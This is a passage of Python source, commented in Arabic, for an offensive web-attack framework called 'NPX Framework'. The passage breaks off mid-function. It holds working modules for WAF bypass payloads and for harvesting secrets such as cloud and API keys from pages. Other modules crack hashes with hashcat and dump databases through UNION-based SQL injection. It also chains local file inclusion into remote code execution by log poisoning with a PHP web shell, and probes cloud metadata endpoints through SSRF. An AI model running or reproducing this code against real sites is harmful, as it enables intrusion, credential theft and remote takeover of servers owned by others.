            print(f"{Colors.FAIL}[-] Nuclei error: {e}{Colors.ENDC}")
        return []

# ======================================================================================
# 16. وحدة فحص Subdomain Takeover
# ======================================================================================
class NPXSubdomainTakeover:
    def __init__(self, framework):
        self.framework = framework
        self.session = framework.session_manager
        
    def check_takeover(self, subdomain):
        """ فحص إذا كان النطاق الفرعي قابلاً للاستيلاء """
        try:
            # 1. فحص وجود CNAME (يحتاج إلى مكتبة dns.resolver في النسخة الكاملة)
            # هنا سنقوم بفحص بسيط عبر HTTP
            response = self.session.send_request("GET", f"http://{subdomain}")
            
            if not response or response.status_code == 404:
                # محاولة ثانية عبر HTTPS
                response = self.session.send_request("GET", f"https://{subdomain}")
                
            if not response:
                print(f"{Colors.WARNING}[!] Potential Takeover: {subdomain} (No response){Colors.ENDC}")
                return {'type': 'Subdomain Takeover', 'url': subdomain, 'details': 'Unresponsive subdomain'}
                
            # التحقق من وجود رسائل خطأ شائعة في الخدمات السحابية
            if response and response.status_code >= 400:
                error_text = response.text.lower()
                takeover_indicators = [
                    "not found", "doesn't exist", "no such bucket", "github pages",
                    "heroku", "unavailable", "project not found", "404"
                ]
                for indicator in takeover_indicators:
                    if indicator in error_text:
                        print(f"{Colors.WARNING}[!] Potential Takeover: {subdomain} (Found: {indicator}){Colors.ENDC}")
                        return {'type': 'Subdomain Takeover', 'url': subdomain, 'details': f'Indicator: {indicator}'}
        except:
            pass
        return None

    def run(self, subdomains):
        print(f"{Colors.OKCYAN}[*] Module: Subdomain Takeover Scanner...{Colors.ENDC}")
        results = []
        for sub in subdomains[:10]:  # فحص أول 10 فقط للسرعة
            result = self.check_takeover(sub)
            if result:
                results.append(result)
        return results

# ======================================================================================
# 17. وحدة إنشاء التقارير المتقدمة
# ======================================================================================
class NPXReportGenerator:
    def __init__(self, framework):
        self.framework = framework
        self.results = {}
        
    def generate_html_report(self, vulnerabilities, exploits, findings, filename="npx_report.html"):
        """ إنشاء تقرير HTML احترافي """
        html = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NPX Framework Security Report</title>
    <style>
        body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0a0a0f; color: #e0e5f0; }}
        .container {{ max-width: 900px; margin: 0 auto; padding: 20px; }}
        .header {{ background: linear-gradient(135deg, #6fffe0, #a78bfa); padding: 20px; border-radius: 10px; text-align: center; margin-bottom: 20px; }}
        h1, h2, h3 {{ color: #6fffe0; }}
        .vuln {{ background: rgba(255, 0, 0, 0.1); border-left: 4px solid #ff4444; padding: 10px; margin: 10px 0; border-radius: 5px; }}
        .exploit {{ background: rgba(0, 255, 0, 0.1); border-left: 4px solid #44ff44; padding: 10px; margin: 10px 0; border-radius: 5px; }}
        .info {{ background: rgba(255, 255, 0, 0.1); border-left: 4px solid #ffcc00; padding: 10px; margin: 10px 0; border-radius: 5px; }}
        .footer {{ text-align: center; margin-top: 30px; color: rgba(255,255,255,0.3); }}
        a {{ color: #6fffe0; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>NPX Framework Security Assessment</h1>
            <p>Target: {self.framework.config.target_url}</p>
            <p><a href="https://npx-official.github.io/">https://npx-official.github.io/</a></p>
        </div>
        
        <h2>Vulnerabilities Found</h2>
        <div id="vulnerabilities">
"""
        if vulnerabilities:
            for vuln in vulnerabilities:
                html += f"""
            <div class="vuln">
                <strong>Type:</strong> {vuln.get('type', 'Unknown')}<br>
                <strong>URL:</strong> {vuln.get('url', 'N/A')}<br>
                <strong>Details:</strong> {vuln.get('details', 'N/A')}
            </div>
"""
        else:
            html += "<p>No vulnerabilities detected.</p>"
            
        html += """
        </div>
        
        <h2>Exploits Achieved</h2>
        <div id="exploits">
"""
        if exploits:
            for exp in exploits:
                html += f"""
            <div class="exploit">
                <strong>Type:</strong> {exp.get('type', 'Unknown')}<br>
                <strong>URL:</strong> {exp.get('url', 'N/A')}<br>
                <strong>Details:</strong> {exp.get('details', 'N/A')}
            </div>
"""
        else:
            html += "<p>No automated exploits executed.</p>"
            
        html += """
        </div>
        
        <div class="footer">
            <p>Generated by NPX Framework v1.0 | &copy; 2026</p>
        </div>
    </div>
</body>
</html>
"""
        with open(filename, 'w') as f:
            f.write(html)
        print(f"{Colors.OKGREEN}[+] Report saved: {filename}{Colors.ENDC}")
        return filename

# ======================================================================================
# 18. تحديث واجهة الأوامر لدعم الوحدات الجديدة
# ======================================================================================
class NPXCLIFinal:
    def __init__(self, framework):
        self.framework = framework
        self.commands = {
            'scan': self.cmd_scan,
            'help': self.cmd_help,
            'exit': self.cmd_exit,
            'clear': self.cmd_clear,
            'info': self.cmd_info,
            'modules': self.cmd_modules,
            'report': self.cmd_report,
            'nuclei': self.cmd_nuclei,
        }
        
    def cmd_scan(self, args):
        if len(args) == 0:
            print(f"{Colors.FAIL}[!] Usage: scan <target_url>{Colors.ENDC}")
            return
            
        target = args[0]
        self.framework.config.target_url = target
        print(f"{Colors.OKCYAN}[*] Target set to: {target}{Colors.ENDC}")
        
        # 1. Reconnaissance
        self.framework.recon.crawl_sitemap()
        
        # 2. Attack Modules
        fuzzer = NPXFuzzerModule(self.framework)
        fuzzer.run(self.framework.recon.discovered_urls['internal'])
        
        sqli = NPXSQLiModule(self.framework)
        sqli.run(self.framework.recon.discovered_urls['internal'])
        
        xss = NPXXSSModule(self.framework)
        xss.run(self.framework.recon.discovered_urls['internal'])
        
        lfi = NPXLFIModule(self.framework)
        lfi.run(self.framework.recon.discovered_urls['internal'])
        
        # 3. Auto Exploitation
        exploit_engine = NPXExploitEngine(self.framework)
        exploit_engine.run(sqli.vulnerabilities + lfi.vulnerabilities)
        
        # 4. CMS Scanner
        wp = NPXWordpressScanner(self.framework)
        wp.run(target)
        
        # 5. Subdomain Takeover
        takeover = NPXSubdomainTakeover(self.framework)
        takeover.run(self.framework.recon.subdomains)
        
        # 6. Save results for report
        self.framework.vulnerabilities = sqli.vulnerabilities + xss.vulnerabilities + lfi.vulnerabilities
        self.framework.exploits = exploit_engine.exploited
        
        print(f"{Colors.OKGREEN}[+] Full scan completed! Use 'report' to generate HTML report.{Colors.ENDC}")

    def cmd_report(self, args):
        """ إنشاء تقرير HTML للنتائج الحالية """
        if not hasattr(self.framework, 'vulnerabilities'):
            print(f"{Colors.FAIL}[!] No scan results found. Run 'scan' first.{Colors.ENDC}")
            return
            
        reporter = NPXReportGenerator(self.framework)
        reporter.generate_html_report(
            self.framework.vulnerabilities,
            self.framework.exploits,
            [],
            "npx_scan_report.html"
        )

    def cmd_nuclei(self, args):
        """ تشغيل Nuclei بشكل منفصل """
        if len(args) == 0:
            print(f"{Colors.FAIL}[!] Usage: nuclei <target_url>{Colors.ENDC}")
            return
        nuclei = NPXNucleiIntegration(self.framework)
        nuclei.run(args[0])

    def cmd_modules(self, args):
        print(f"{Colors.OKCYAN}NPX Framework Modules:{Colors.ENDC}")
        print("  - Fuzzer          : Directory & File Bruteforce")
        print("  - SQLi            : SQL Injection Scanner")
        print("  - XSS             : Cross-Site Scripting Detector")
        print("  - LFI             : Local File Inclusion Scanner")
        print("  - Exploit         : Auto Exploitation Engine")
        print("  - Wordpress       : CMS & Plugin Scanner")
        print("  - Subdomain       : Subdomain Takeover Checker")
        print("  - Nuclei          : CVE Discovery (external)")
        print("  - Report          : HTML Report Generator")

    def cmd_help(self, args):
        help_text = f"""
{Colors.OKCYAN}NPX Framework v1.0 Commands:{Colors.ENDC}
  {Colors.WARNING}help{Colors.ENDC}          Show this help message
  {Colors.WARNING}scan <url>{Colors.ENDC}    Start full scan (Recon + Modules + Exploit)
  {Colors.WARNING}modules{Colors.ENDC}       List all available modules
  {Colors.WARNING}nuclei <url>{Colors.ENDC}  Run Nuclei CVE scanner
  {Colors.WARNING}report{Colors.ENDC}        Generate HTML report of last scan
  {Colors.WARNING}info{Colors.ENDC}          Show current configuration
  {Colors.WARNING}clear{Colors.ENDC}         Clear the screen
  {Colors.WARNING}exit{Colors.ENDC}          Exit the framework
        """
        print(help_text)

    def cmd_info(self, args):
        print(f"{Colors.OKCYAN}NPX Framework v1.0 (Full Suite){Colors.ENDC}")
        print(f"  Target: {self.framework.config.target_url or 'Not set'}")
        print(f"  Threads: {self.framework.config.threads}")
        print(f"  Report: npx_scan_report.html")

    def cmd_exit(self, args):
        print(f"{Colors.DIM}Goodbye from NPX Framework!{Colors.ENDC}")
        sys.exit(0)

    def cmd_clear(self, args):
        os.system('clear' if os.name == 'posix' else 'cls')
# ======================================================================================
# 19. محرك استغلال تجاوز الـ WAF (WAF Bypass Engine)
# ======================================================================================
class NPXWAFBypassEngine:
    def __init__(self, framework):
        self.framework = framework
        self.session = framework.session_manager
        self.waf_signatures = {
            'Cloudflare': ['cf-ray', '__cfduid', 'cf-chl-bypass'],
            'AWS WAF': ['x-amzn-RequestId', 'x-amzn-ErrorType'],
            'ModSecurity': ['ModSecurity', 'This error was generated by Mod_Security'],
            'F5 BIG-IP': ['BIGipServer', 'TS01a6'],
            'Akamai': ['akamai', 'x-akamai-'],
            'Incapsula': ['incap_ses', 'visid_incap'],
            'Sucuri': ['sucuri', 'cloudproxy'],
            'Wordfence': ['wf-', 'wordfence'],
            'Generic WAF': ['403 Forbidden', 'Access Denied', 'Request blocked']
        }
        
    def detect_waf(self, url):
        """ الكشف عن نوع WAF المثبت """
        try:
            response = self.session.send_request("GET", url)
            if not response:
                return None
                
            headers = response.headers
            content = response.text.lower()
            
            detected = []
            for waf, signatures in self.waf_signatures.items():
                for sig in signatures:
                    if sig in str(headers).lower() or sig.lower() in content:
                        detected.append(waf)
                        break
                        
            if detected:
                print(f"{Colors.WARNING}[!] WAF Detected: {', '.join(detected)}{Colors.ENDC}")
                return detected
            else:
                print(f"{Colors.OKGREEN}[+] No WAF detected (or generic).{Colors.ENDC}")
                return []
        except:
            return []

    def generate_bypass_payloads(self, payload, waf_type=None):
        """ توليد بايلودات مخصصة لتجاوز WAF """
        bypass_payloads = [payload]
        
        # 1. Double URL Encoding
        bypass_payloads.append(quote(quote(payload)))
        
        # 2. Case Swapping (تبديل الأحرف)
        if "select" in payload.lower():
            bypass_payloads.append(payload.replace("select", "SeLeCt"))
            bypass_payloads.append(payload.replace("select", "sElect"))
            
        # 3. Comment Injection (حقن التعليقات)
        if waf_type == 'Cloudflare':
            bypass_payloads.append(payload.replace(" ", "/*!*/"))
            bypass_payloads.append(payload.replace(" ", "**/**"))
            
        # 4. URL Fragment Exploitation
        if '?' in payload:
            bypass_payloads.append(payload.replace('?', '%3f'))
            
        # 5. Multi-encoding
        bypass_payloads.append(base64.b64encode(payload.encode()).decode())
        
        return bypass_payloads

    def test_bypass(self, url, param, original_payload):
        """ اختبار تجاوز WAF باستخدام البايلودات المولدة """
        bypass_payloads = self.generate_bypass_payloads(original_payload)
        for bp in bypass_payloads:
            test_url = url.replace(f"{param}=", f"{param}={quote(bp)}")
            try:
                response = self.session.send_request("GET", test_url)
                if response and response.status_code == 200:
                    print(f"{Colors.OKGREEN}[+] WAF Bypass Success with: {bp[:20]}...{Colors.ENDC}")
                    return test_url, bp
            except:
                pass
        return None, None

    def run(self, target_urls, vulnerabilities):
        """ تشغيل محرك تجاوز WAF """
        print(f"{Colors.OKCYAN}[*] Module: WAF Bypass Engine...{Colors.ENDC}")
        
        # الكشف عن WAF
        waf_list = self.detect_waf(self.framework.config.target_url)
        waf_type = waf_list[0] if waf_list else None
        
        # محاولة تجاوز الثغرات الموجودة
        bypassed = []
        for vuln in vulnerabilities:
            if 'url' in vuln and 'param' in vuln:
                result, bp = self.test_bypass(vuln['url'], vuln['param'], vuln.get('payload', "' OR '1'='1"))
                if result:
                    bypassed.append({'original': vuln, 'bypass_url': result, 'payload': bp})
                    
        return bypassed

# ======================================================================================
# 20. وحدة استخراج بيانات الاعتماد (Credential Harvester)
# ======================================================================================
class NPXCredentialHarvester:
    def __init__(self, framework):
        self.framework = framework
        self.session = framework.session_manager
        
    def scan_for_credentials(self, response_text, url):
        """ البحث عن مفاتيح وكلمات مرور داخل النص """
        found = []
        
        # أنماط للبحث عن المفاتيح
        patterns = {
            'AWS Key': r'AKIA[0-9A-Z]{16}',
            'AWS Secret': r'[A-Za-z0-9/+=]{40}',
            'Google API': r'AIza[0-9A-Za-z-_]{35}',
            'GitHub Token': r'ghp_[0-9A-Za-z-_]{36}',
            'Stripe Key': r'sk_(live|test)_[0-9A-Za-z]{24}',
            'Slack Token': r'xox[baprs]-[0-9A-Za-z-]{10,48}',
            'Discord Token': r'[A-Za-z0-9_]{24,30}\.[A-Za-z0-9_]{6,8}\.[A-Za-z0-9_\-]{27,38}',
            'Password in Text': r'(password|pass|pwd)[\s:=]+([^\s]{4,20})',
            'API Key': r'(api[_\-]?key|apikey)[\s:=]+([^\s]{16,})',
            'JWT Token': r'eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+',
            'Database Connection': r'(mongodb|mysql|postgresql)://[^/]+:[^@]+@[^/]+',
        }
        
        for name, pattern in patterns.items():
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            if matches:
                for match in matches:
                    if isinstance(match, tuple):
                        match = match[0] if len(match) == 1 else match[1]
                    if len(str(match)) > 4:  # تجاهل القيم القصيرة جداً
                        found.append({'type': name, 'value': match, 'source': url})
                        print(f"{Colors.FAIL}[!] Credential Found: {name} -> {match[:20]}...{Colors.ENDC}")
        return found

    def run(self, discovered_urls):
        print(f"{Colors.OKCYAN}[*] Module: Credential Harvester...{Colors.ENDC}")
        all_creds = []
        for url in discovered_urls:
            try:
                response = self.session.send_request("GET", url)
                if response and response.status_code == 200:
                    creds = self.scan_for_credentials(response.text, url)
                    all_creds.extend(creds)
            except:
                pass
        return all_creds

# ======================================================================================
# 21. وحدة دمج كسر الهاشات (Hashcat Integration)
# ======================================================================================
class NPXHashcatIntegration:
    def __init__(self, framework):
        self.framework = framework
        
    def detect_hash_type(self, hash_string):
        """ الكشف عن نوع الهاش """
        if re.match(r'^[0-9a-f]{32}$', hash_string):
            return 'MD5', 0
        elif re.match(r'^[0-9a-f]{40}$', hash_string):
            return 'SHA1', 100
        elif re.match(r'^[0-9a-f]{64}$', hash_string):
            return 'SHA256', 1400
        elif '$2y$' in hash_string:
            return 'bcrypt', 3200
        elif '$1$' in hash_string:
            return 'md5crypt', 500
        elif ':NT:' in hash_string:
            return 'NTLM', 1000
        return 'Unknown', 0

    def crack_hash(self, hash_string):
        """ محاولة كسر الهاش باستخدام rockyou.txt """
        hash_type, hashcat_mode = self.detect_hash_type(hash_string)
        if hash_type == 'Unknown':
            print(f"{Colors.FAIL}[-] Unsupported hash type: {hash_string}{Colors.ENDC}")
            return None
            
        print(f"{Colors.WARNING}[!] Trying to crack: {hash_string} ({hash_type}){Colors.ENDC}")
        print(f"{Colors.DIM}    Mode: {hashcat_mode}{Colors.ENDC}")
        
        # التحقق من وجود hashcat
        import subprocess
        try:
            subprocess.run(["hashcat", "--version"], capture_output=True, check=True)
        except:
            print(f"{Colors.FAIL}[-] Hashcat not installed. Install with: sudo apt install hashcat{Colors.ENDC}")
            return None
            
        # تشغيل hashcat
        output_file = "hashcat_output.txt"
        cmd = [
            "hashcat", "-m", str(hashcat_mode), "-a", "0",
            "-o", output_file, "--force", "--quiet",
            hash_string, "/usr/share/wordlists/rockyou.txt"
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            if os.path.exists(output_file):
                with open(output_file, 'r') as f:
                    cracked = f.read().strip()
                if cracked and ':' in cracked:
                    password = cracked.split(':')[-1]
                    print(f"{Colors.OKGREEN}[+] Password Cracked: {password}{Colors.ENDC}")
                    os.remove(output_file)
                    return password
        except:
            pass
        return None

    def run(self, credentials):
        print(f"{Colors.OKCYAN}[*] Module: Hashcat Integration...{Colors.ENDC}")
        for cred in credentials:
            if len(cred['value']) <= 64 and ' ' not in cred['value']:
                password = self.crack_hash(cred['value'])
                if password:
                    cred['cracked'] = password

# ======================================================================================
# 22. مولد سلاسل الهجوم (Exploit Chain Builder)
# ======================================================================================
class NPXExploitChainBuilder:
    def __init__(self, framework):
        self.framework = framework
        self.chains = []
        
    def build_lfi_to_rce_chain(self, lfi_url, param):
        """ بناء سلسلة LFI -> Log Poisoning -> RCE """
        print(f"{Colors.WARNING}[!] Building exploit chain: LFI -> RCE on {lfi_url}{Colors.ENDC}")
        
        # 1. محاولة حقن كود PHP في سجلات الخادم
        log_files = [
            "/var/log/apache2/access.log",
            "/var/log/apache2/error.log",
            "/var/log/nginx/access.log",
            "/var/log/nginx/error.log",
            "/var/log/auth.log",
            "/var/log/mysql/mysql.log"
        ]
        
        # 2. حقن الـ Shell عبر User-Agent
        shell_code = "<?php system($_GET['cmd']); ?>"
        
        # إنشاء جلسة خاصة للحقن
        session = self.framework.session_manager.get_session()
        if session:
            session.headers.update({'User-Agent': shell_code})
            session.get(self.framework.config.target_url)
            
            # 3. محاولة الوصول إلى ملف السجل
            for log in log_files:
                test_url = lfi_url.replace(f"{param}=", f"{param}={quote(log)}")
                response = session.get(test_url, timeout=5)
                if response and "<?php system" in response.text:
                    print(f"{Colors.OKGREEN}[+] RCE Achieved via Log Poisoning!{Colors.ENDC}")
                    self.chains.append({
                        'type': 'LFI -> Log Poisoning -> RCE',
                        'url': test_url,
                        'log_file': log,
                        'cmd': f'{test_url}&cmd=id'
                    })
                    return self.chains[-1]
        return None

    def run(self, vulnerabilities):
        print(f"{Colors.OKCYAN}[*] Module: Exploit Chain Builder...{Colors.ENDC}")
        for vuln in vulnerabilities:
            if vuln['type'] == 'LFI':
                self.build_lfi_to_rce_chain(vuln['url'], vuln.get('param', 'file'))

# ======================================================================================
# 23. واجهة REST API (للاتصال عبر الشبكة)
# ======================================================================================
class NPXRESTAPI:
    def __init__(self, framework):
        self.framework = framework
        self.port = 8080
        self.is_running = False
        
    def start(self):
        """ تشغيل واجهة REST API """
        try:
            from flask import Flask, jsonify, request
        except ImportError:
            print(f"{Colors.FAIL}[-] Flask not installed. Install with: pip install flask{Colors.ENDC}")
            return None
            
        app = Flask("NPX-API")
        
        @app.route('/api/v1/scan', methods=['POST'])
        def api_scan():
            data = request.json
            target = data.get('target', '')
            if not target:
                return jsonify({'error': 'No target provided'}), 400
                
            self.framework.config.target_url = target
            # تشغيل فحص سريع
            return jsonify({'status': 'scan_started', 'target': target})
            
        @app.route('/api/v1/status', methods=['GET'])
        def api_status():
            return jsonify({'status': 'running', 'target': self.framework.config.target_url})
            
        @app.route('/api/v1/report', methods=['GET'])
        def api_report():
            # إنشاء تقرير JSON
            report = {
                'target': self.framework.config.target_url,
                'modules': ['Fuzzer', 'SQLi', 'XSS', 'LFI', 'Exploit'],
                'version': '1.0'
            }
            return jsonify(report)
            
        print(f"{Colors.OKGREEN}[+] REST API started on port {self.port}{Colors.ENDC}")
        app.run(host='0.0.0.0', port=self.port)

# ======================================================================================
# 24. تحديث واجهة الأوامر النهائية
# ======================================================================================
class NPXCLIUltimate:
    def __init__(self, framework):
        self.framework = framework
        self.commands = {
            'scan': self.cmd_scan,
            'help': self.cmd_help,
            'exit': self.cmd_exit,
            'clear': self.cmd_clear,
            'info': self.cmd_info,
            'modules': self.cmd_modules,
            'report': self.cmd_report,
            'nuclei': self.cmd_nuclei,
            'bypass': self.cmd_bypass,
            'api': self.cmd_api,
            'chain': self.cmd_chain,
        }
        
    def cmd_bypass(self, args):
        """ تشغيل محرك تجاوز WAF """
        if not hasattr(self.framework, 'vulnerabilities'):
            print(f"{Colors.FAIL}[!] Run 'scan' first to find vulnerabilities.{Colors.ENDC}")
            return
        waf = NPXWAFBypassEngine(self.framework)
        waf.run(self.framework.recon.discovered_urls['internal'], self.framework.vulnerabilities)

    def cmd_api(self, args):
        """ تشغيل واجهة REST API """
        api = NPXRESTAPI(self.framework)
        api.start()

    def cmd_chain(self, args):
        """ بناء سلاسل الهجوم """
        if not hasattr(self.framework, 'vulnerabilities'):
            print(f"{Colors.FAIL}[!] Run 'scan' first.{Colors.ENDC}")
            return
        chain = NPXExploitChainBuilder(self.framework)
        chain.run(self.framework.vulnerabilities)

    def cmd_scan(self, args):
        if len(args) == 0:
            print(f"{Colors.FAIL}[!] Usage: scan <target_url>{Colors.ENDC}")
            return
            
        target = args[0]
        self.framework.config.target_url = target
        print(f"{Colors.OKCYAN}[*] Target set to: {target}{Colors.ENDC}")
        
        # 1. Reconnaissance
        self.framework.recon.crawl_sitemap()
        
        # 2. Attack Modules
        fuzzer = NPXFuzzerModule(self.framework)
        fuzzer.run(self.framework.recon.discovered_urls['internal'])
        
        sqli = NPXSQLiModule(self.framework)
        sqli.run(self.framework.recon.discovered_urls['internal'])
        
        xss = NPXXSSModule(self.framework)
        xss.run(self.framework.recon.discovered_urls['internal'])
        
        lfi = NPXLFIModule(self.framework)
        lfi.run(self.framework.recon.discovered_urls['internal'])
        
        # 3. Auto Exploitation
        exploit_engine = NPXExploitEngine(self.framework)
        exploit_engine.run(sqli.vulnerabilities + lfi.vulnerabilities)
        
        # 4. Additional Scans
        wp = NPXWordpressScanner(self.framework)
        wp.run(target)
        
        takeover = NPXSubdomainTakeover(self.framework)
        takeover.run(self.framework.recon.subdomains)
        
        # 5. Credential Harvesting
        harvester = NPXCredentialHarvester(self.framework)
        creds = harvester.run(self.framework.recon.discovered_urls['internal'])
        
        # 6. Hashcat Integration
        if creds:
            hashcat = NPXHashcatIntegration(self.framework)
            hashcat.run(creds)
        
        self.framework.vulnerabilities = sqli.vulnerabilities + xss.vulnerabilities + lfi.vulnerabilities
        self.framework.exploits = exploit_engine.exploited
        
        print(f"{Colors.OKGREEN}[+] Full scan completed! Use 'report' to generate HTML report.{Colors.ENDC}")

    def cmd_report(self, args):
        if not hasattr(self.framework, 'vulnerabilities'):
            print(f"{Colors.FAIL}[!] No scan results found. Run 'scan' first.{Colors.ENDC}")
            return
        reporter = NPXReportGenerator(self.framework)
        reporter.generate_html_report(
            self.framework.vulnerabilities,
            self.framework.exploits,
            [],
            "npx_scan_report.html"
        )

    def cmd_nuclei(self, args):
        if len(args) == 0:
            print(f"{Colors.FAIL}[!] Usage: nuclei <target_url>{Colors.ENDC}")
            return
        nuclei = NPXNucleiIntegration(self.framework)
        nuclei.run(args[0])

    def cmd_modules(self, args):
        print(f"{Colors.OKCYAN}NPX Ultimate Modules:{Colors.ENDC}")
        print("  - Fuzzer          : Directory & File Bruteforce")
        print("  - SQLi            : SQL Injection Scanner")
        print("  - XSS             : Cross-Site Scripting Detector")
        print("  - LFI             : Local File Inclusion Scanner")
        print("  - Exploit         : Auto Exploitation Engine")
        print("  - WAF Bypass      : WAF Detection & Bypass")
        print("  - Credentials     : Credential Harvester")
        print("  - Hashcat         : Password Cracking")
        print("  - Chain           : Exploit Chain Builder")
        print("  - Nuclei          : CVE Discovery (external)")
        print("  - API             : REST API Interface")

    def cmd_help(self, args):
        help_text = f"""
{Colors.OKCYAN}NPX Framework v1.0 Ultimate Commands:{Colors.ENDC}
  {Colors.WARNING}help{Colors.ENDC}          Show this help message
  {Colors.WARNING}scan <url>{Colors.ENDC}    Start full scan
  {Colors.WARNING}modules{Colors.ENDC}       List all available modules
  {Colors.WARNING}nuclei <url>{Colors.ENDC}  Run Nuclei CVE scanner
  {Colors.WARNING}report{Colors.ENDC}        Generate HTML report
  {Colors.WARNING}bypass{Colors.ENDC}        Run WAF Bypass on found vulns
  {Colors.WARNING}chain{Colors.ENDC}         Build exploit chains (LFI->RCE)
  {Colors.WARNING}api{Colors.ENDC}           Start REST API on port 8080
  {Colors.WARNING}info{Colors.ENDC}          Show current configuration
  {Colors.WARNING}clear{Colors.ENDC}         Clear the screen
  {Colors.WARNING}exit{Colors.ENDC}          Exit the framework
        """
        print(help_text)

    def cmd_info(self, args):
        print(f"{Colors.OKCYAN}NPX Framework v1.0 Ultimate Suite{Colors.ENDC}")
        print(f"  Target: {self.framework.config.target_url or 'Not set'}")
        print(f"  Threads: {self.framework.config.threads}")
        print(f"  Report: npx_scan_report.html")

    def cmd_exit(self, args):
        print(f"{Colors.DIM}Goodbye from NPX Framework!{Colors.ENDC}")
        sys.exit(0)

    def cmd_clear(self, args):
        os.system('clear' if os.name == 'posix' else 'cls')

# ======================================================================================
# 25. تحديث الفئة الرئيسية لاستخدام واجهة الأوامر النهائية
# ======================================================================================
class NPXFrameworkUltimate:
    def __init__(self):
        self.config = NPXConfig()
        self.session_manager = NPXSessionManager(self.config)
        self.recon = NPXReconEngine(self.session_manager)
        self.cli = NPXCLIUltimate(self)
        self.is_running = False
        self.vulnerabilities = []
        self.exploits = []
        self.modules = {}
        
    def load_config(self, path: str):
        self.config.load_from_file(path)
        
    def run_cli(self):
        self.is_running = True
        self.cli.run()
# ======================================================================================
# 26. وحدة ما بعد الاستغلال (Post-Exploitation Engine)
# ======================================================================================
class NPXPostExploit:
    def __init__(self, framework):
        self.framework = framework
        self.session = framework.session_manager
        self.results = {}
        
    def exploit_sqli_dump(self, url, param, db_type="mysql"):
        """ محاولة استخراج جداول قاعدة البيانات عبر SQLi """
        print(f"{Colors.WARNING}[!] Post-Exploit: Attempting SQLi Database Dump on {url}{Colors.ENDC}")
        
        # استخراج أسماء الجداول
        if db_type == "mysql":
            payload = f"UNION SELECT table_name, NULL, NULL FROM information_schema.tables WHERE table_schema=database()-- "
        elif db_type == "postgresql":
            payload = f"UNION SELECT table_name, NULL, NULL FROM information_schema.tables WHERE table_schema='public'-- "
        else:
            return None
            
        test_url = url.replace(f"{param}=", f"{param}={quote(payload)}")
        response = self.session.send_request("GET", test_url)
        
        if response:
            # البحث عن أسماء الجداول في الاستجابة
            tables = re.findall(r'([a-zA-Z0-9_]{2,20})', response.text)
            found_tables = [t for t in tables if t not in ['NULL', 'null', 'table_name']][:5]
            
            if found_tables:
                print(f"{Colors.OKGREEN}[+] SQLi Dump: Found tables: {', '.join(found_tables)}{Colors.ENDC}")
                self.results['tables'] = found_tables
                
                # استخراج بيانات من الجدول الأول
                if found_tables:
                    first_table = found_tables[0]
                    data_payload = f"UNION SELECT * FROM {first_table} LIMIT 5-- "
                    data_url = url.replace(f"{param}=", f"{param}={quote(data_payload)}")
                    data_resp = self.session.send_request("GET", data_url)
                    if data_resp:
                        print(f"{Colors.OKGREEN}[+] Data extracted from {first_table}: {data_resp.text[:100]}...{Colors.ENDC}")
                        self.results['data'] = data_resp.text[:200]
        return self.results

    def upload_shell_via_lfi(self, lfi_url, param):
        """ رفع Web Shell عبر LFI باستخدام Log Poisoning """
        print(f"{Colors.WARNING}[!] Post-Exploit: Uploading Shell via LFI...{Colors.ENDC}")
        
        # حقن كود PHP في User-Agent
        shell_code = b"<?php system($_GET['cmd']); ?>"
        session = self.session.get_session()
        if session:
            session.headers.update({'User-Agent': shell_code})
            session.get(self.framework.config.target_url)
            
            # محاولة الوصول إلى ملفات السجل
            log_files = [
                "/var/log/apache2/access.log",
                "/var/log/nginx/access.log",
                "/var/log/auth.log"
            ]
            for log in log_files:
                test_url = lfi_url.replace(f"{param}=", f"{param}={quote(log)}")
                response = session.get(test_url, timeout=5)
                if response and "<?php system" in response.text:
                    shell_url = test_url + "&cmd=id"
                    print(f"{Colors.OKGREEN}[+] Shell Uploaded! Access at: {shell_url}{Colors.ENDC}")
                    self.results['shell_url'] = shell_url
                    return self.results
        return None

    def run(self, vulnerabilities):
        print(f"{Colors.OKCYAN}[*] Module: Post-Exploitation Engine...{Colors.ENDC}")
        for vuln in vulnerabilities:
            if vuln['type'] == 'SQLi':
                self.exploit_sqli_dump(vuln['url'], vuln.get('param', 'id'))
            elif vuln['type'] == 'LFI':
                self.upload_shell_via_lfi(vuln['url'], vuln.get('param', 'file'))
        return self.results

# ======================================================================================
# 27. وحدة فحص SSRF (Server-Side Request Forgery)
# ======================================================================================
class NPXSSRFScanner:
    def __init__(self, framework):
        self.framework = framework
        self.session = framework.session_manager
        self.findings = []
        
    def test_ssrf(self, url, param):
        """ اختبار SSRF ضد خدمات AWS وخدمات داخلية """
        internal_endpoints = [
            "http://169.254.169.254/latest/meta-data/",  # AWS Metadata
            "http://169.254.169.254/latest/user-data/",
            "http://metadata.google.internal/computeMetadata/v1/",  # GCP Metadata
            "http://127.0.0.1:8080/admin",  # Localhost
            "http://127.0.0.1:22", # SSH
            "file:///etc/passwd"
        ]
        for endpoint in internal_endpoints:
            test_url = url.replace(f"{param}=", f"{param}={quote(endpoint)}")
            try:
                response = self.session.send_request("GET", test_url)
                if response:
                    if "root:x:0:0" in response.text:
                        self.findings.append({'type': 'SSRF', 'url': test_url, 'details': 'File read via file://'})
                        print(f"{Colors.FAIL}[!] SSRF Found! Able to read /etc/passwd{Colors.ENDC}")
                    elif "instance-id" in response.text or "hostname" in response.text:
                        self.findings.append({'type': 'SSRF', 'url': test_url, 'details': 'AWS Metadata Exposure'})
                        print(f"{Colors.FAIL}[!] SSRF Found! AWS Metadata Exposed.{Colors.ENDC}")
            except:
                pass
        return self.findings

    def run(self, target_urls):
        print(f"{Colors.OKCYAN}[*] Module: SSRF Scanner...{Colors.ENDC}")
        testable_urls = [url for url in target_urls if '?' in url and '=' in url]
        for url in testable_urls:
            parsed = urllib.parse.urlparse(url)
            for part in parsed.query.split('&'):
                if '=' in part:
                    param = part.split('=')[0]
                    if param.lower() in ['url', 'uri', 'path', 'src', 'dest', 'redirect']:
                        self.test_ssrf(url, param)
        return self.findings

# ======================================================================================
# 28. وحدة حقن XXE (XML External Entity Injection)
# ======================================================================================
class NPXXMLEngine:
    def __init__(self, framework):
        self.framework = framework
        self.session = framework.session_manager
        self.findings = []
        
    def generate_xxe_payload(self, file_path="/etc/passwd"):
        """ توليد بايلود XXE لقراءة الملفات """
